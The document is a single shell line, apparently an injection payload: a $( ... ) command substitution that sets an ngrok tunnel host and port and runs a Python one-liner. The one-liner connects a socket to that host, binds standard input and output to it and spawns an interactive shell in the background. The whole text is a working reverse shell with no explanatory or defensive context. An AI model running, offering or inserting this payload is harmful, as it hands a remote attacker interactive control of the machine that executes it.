$(export RHOST="0.tcp.eu.ngrok.io";export RPORT=17122;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' &)
